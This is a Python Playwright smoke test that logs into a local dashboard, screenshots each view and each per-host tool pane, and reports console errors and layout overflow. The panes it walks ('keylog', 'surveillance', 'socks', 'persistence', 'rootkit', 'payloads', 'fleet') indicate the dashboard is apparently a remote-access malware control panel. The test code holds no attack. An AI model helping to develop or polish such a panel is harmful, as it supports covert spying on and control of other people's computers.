"""Headless dashboard smoke test.

Boots against an already running (ideally seeded) server, walks every view and
host pane, screenshots them and fails on any console error, failed request or
layout overflow.

    python tools/uicheck.py http://127.0.0.1:8014 admin:secret .tmp/shots
"""

import json
import os
import sys

from playwright.sync_api import sync_playwright

VIEWS = ["overview", "fleet", "payloads", "activity", "environment"]
TOOLS = ["console", "files", "keylog", "surveillance", "network", "socks",
         "persistence", "rootkit", "info", "processes"]

URL = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8014").rstrip("/")
AUTH = sys.argv[2] if len(sys.argv) > 2 else "admin:secret"
OUT = sys.argv[3] if len(sys.argv) > 3 else "."

user, _, password = AUTH.partition(":")
errors = []
current = ["boot"]


def overflow(page):
    return page.evaluate("""() => {
        const m = document.getElementById('main');
        return m ? m.scrollWidth - m.clientWidth : 0;
    }""")


def main():
    os.makedirs(OUT, exist_ok=True)
    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        page = browser.new_page(viewport={"width": 1480, "height": 940})
        page.on("console", lambda m: errors.append(f"console.{m.type}@{current[0]}: {m.text}")
                if m.type == "error" else None)
        page.on("pageerror", lambda e: errors.append(f"pageerror@{current[0]}: {e}"))
        page.on("requestfailed", lambda r: errors.append(f"requestfailed@{current[0]}: {r.url}"))

        page.goto(URL + "/login", wait_until="networkidle")
        page.fill("#user", user)
        page.fill("#pass", password)
        page.click("#go")
        page.wait_for_url("**/#/overview", timeout=20000)
        page.wait_for_selector(".kpi-grid", timeout=20000)

        summary = {}
        for view in VIEWS:
            current[0] = view
            page.goto(f"{URL}/#/{view}")
            page.wait_for_timeout(1200)
            summary[view] = {"blocks": page.locator(".card, .kpi, tr[data-id]").count(),
                             "overflow": overflow(page)}
            page.screenshot(path=os.path.join(OUT, f"ui-{view}.png"))

        current[0] = "host"
        page.goto(f"{URL}/#/fleet")
        page.wait_for_selector("tr[data-id]", timeout=20000)
        sid = page.get_attribute("tr[data-id]", "data-id")
        for tool in TOOLS:
            current[0] = "host:" + tool
            page.goto(f"{URL}/#/host/{sid}/{tool}")
            page.wait_for_timeout(900)
            summary["host:" + tool] = {"panes": page.locator("#toolbody").count(),
                                       "overflow": overflow(page)}
            page.screenshot(path=os.path.join(OUT, f"ui-host-{tool}.png"))

        current[0] = "palette"
        page.goto(f"{URL}/#/fleet")
        page.keyboard.press("Control+k")
        page.wait_for_timeout(400)
        summary["palette"] = {"items": page.locator("#palette-list li").count()}
        page.keyboard.press("Escape")

        print(json.dumps(summary, indent=1))
        browser.close()

    if errors:
        print("ERRORS:\n" + "\n".join(errors))
        sys.exit(1)
    print("OK - no console errors")


if __name__ == "__main__":
    main()
